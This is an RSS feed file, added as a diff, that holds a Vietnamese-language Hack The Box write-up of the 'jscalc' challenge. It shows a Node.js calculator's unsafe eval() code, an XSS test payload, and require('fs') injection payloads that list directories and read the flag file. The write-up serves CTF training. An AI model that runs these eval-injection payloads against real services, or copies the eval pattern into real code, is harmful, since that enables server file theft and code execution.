@@ -1,0 +1,57 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>Hackthebox - Category - Tu dep trai</title>
+        <link>https://g03m0n.github.io/categories/hackthebox/</link>
+        <description>Hackthebox - Category - Tu dep trai</description>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 22 Aug 2023 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/categories/hackthebox/" rel="self" type="application/rss+xml" /><item>
+    <title>Hackthebox - jscalc</title>
+    <link>https://g03m0n.github.io/posts/hackthebox-jscalc/hackthebox-jscalc/</link>
+    <pubDate>Tue, 22 Aug 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/hackthebox-jscalc/hackthebox-jscalc/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link challenge tại <a href="https://app.hackthebox.com/challenges/jscalc" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="step">Step</h2>
+<p>Đây là giao diện chính của challenge:</p>
+<p></p>
+<p>Vì chương trình sử dụng hàm <code>eval()</code> để tính toán nên ta có thể tiêm vào một payload XSS:</p>
+<pre tabindex="0"><code>100*10-3+340 +&#39;&lt;img src=abc onerror=&#34;alert(123)&#34;&gt;&#39;
+</code></pre><p></p>
+<p>Kiểm tra source code, đọc file <code>package.json</code>, nhận thấy challenge sử dụng <code>node.js</code>
+=&gt; Có thể <a href="https://www.codecademy.com/learn/javascript-back-end-development/modules/introduction-to-node-js/cheatsheet" target="_blank" rel="noopener noreffer">execute JavaScript code</a>
+ ở back-end.</p>
+<p></p>
+<p>Chương trình sử dụng API <code>api/calculate</code>.
+Từ <code>web_jscalc/challenge/routes/computerHelper.js</code>, hàm <code>calculate()</code> trả về kết quả từ hàm <code>eval()</code> và đưa ra một ngoại lệ chỉ khi có lỗi cú pháp. Do đó nó không kiểm tra các trường hợp ngoại lệ khác.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">module</span><span style="color:#f92672">.</span><span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">calculate</span>(<span style="color:#a6e22e">formula</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">`(function() { return ${ formula } ;}())`</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span> <span style="color:#a6e22e">instanceof</span> <span style="color:#a6e22e">SyntaxError</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Something went wrong!&#39;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>Node.js</code> có một số mô-đun tích hợp có thể được sử dụng để chèn lệnh: <code>process</code>, <code>fs</code>, <code>readdir()</code>, <code>readFile()</code>,&hellip;</p>
+<p>Tiến hành khai thác:
+Đầu tiên kiểm tra đường dẫn hiện tại bằng query:</p>
+<pre tabindex="0"><code>process.cwd()
+</code></pre><p></p>
+<p>Kiểm tra các thư mục và file có trong thư mục hiện tại bằng cách sử dụng <code>readdirSync()</code>:</p>
+<pre tabindex="0"><code>require(&#39;fs&#39;).readdirSync(&#39;/app&#39;).toString()
+</code></pre><p></p>
+<p>Thêm dấu <code>..</code> vào trước đường dẫn để kiểm tra tại thư mục <code>/</code>:</p>
+<pre tabindex="0"><code>require(&#39;fs&#39;).readdirSync(&#39;../&#39;).toString()
+</code></pre><p></p>
+<p>Sử dụng <code>readFileSync()</code> để đọc file <code>flag.txt</code>:</p>
+<pre tabindex="0"><code>require(&#39;fs&#39;).readFileSync(&#34;/flax.txt&#34;).toString()
+</code></pre><p></p>
+<p>Flag: <code>HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}</code></p>
+]]></description>
+</item>
+</channel>
+</rss>
